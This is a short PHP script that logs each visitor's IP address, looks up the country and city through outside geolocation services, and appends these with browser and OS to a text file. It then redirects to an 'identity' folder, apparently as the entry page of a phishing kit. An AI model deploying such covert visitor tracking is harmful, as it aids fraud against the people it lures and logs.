<?php
include"./agent.php";

$ip_address = getenv("REMOTE_ADDR");
$url = 'http://ip-api.com/json/'.$ip_address;
$response = file_get_contents($url);
$ip_info = json_decode($response, true);

$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip_address");
$country = $J7->geoplugin_countryName ; 
$city = $J7->geoplugin_city ; 
$file = fopen("Views.txt","a");

fwrite($file,">".$ip_address." >".$country."-".$city." >".gmdate ("Y-n-d")." - ".gmdate ("H:i:s")." >".$user_browser." - ".$user_os."\n");

header('Location: ./identity/');

 ?>